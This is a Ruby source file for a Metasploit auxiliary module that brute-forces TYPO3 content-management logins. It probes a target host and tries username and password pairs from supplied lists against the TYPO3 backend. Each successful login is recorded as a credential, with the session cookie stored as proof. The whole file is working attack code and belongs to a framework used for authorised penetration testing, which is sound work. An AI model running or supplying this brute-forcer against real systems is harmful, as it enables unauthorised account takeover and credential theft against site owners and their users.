##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HTTP::Typo3
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Typo3 Login Bruteforcer',
      'Description' => 'This module attempts to bruteforce Typo3 logins.',
      'Author'      => [ 'Christian Mehlmauer' ],
      'License'     => MSF_LICENSE
    )
  end

  def run_host(ip)
    print_status("Trying to bruteforce login")

    res = send_request_cgi({
      'method'  => 'GET',
      'uri'	 => target_uri.to_s
    })

    unless res
      vprint_error("#{ip} seems to be down")
      return
    end

    each_user_pass { |user, pass|
      try_login(user,pass)
    }
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def try_login(user, pass)
    vprint_status("Trying username:'#{user}' password: '#{pass}'")
    cookie = typo3_backend_login(user, pass)
    if cookie
      print_good("Successful login '#{user}' password: '#{pass}'")
      report_cred(
        ip: rhost,
        port: rport,
        service_name: 'typo3',
        user: user,
        password: pass,
        proof: cookie
      )
      return :next_user
    else
      vprint_error("failed to login as '#{user}' password: '#{pass}'")
      return
    end
  end
end
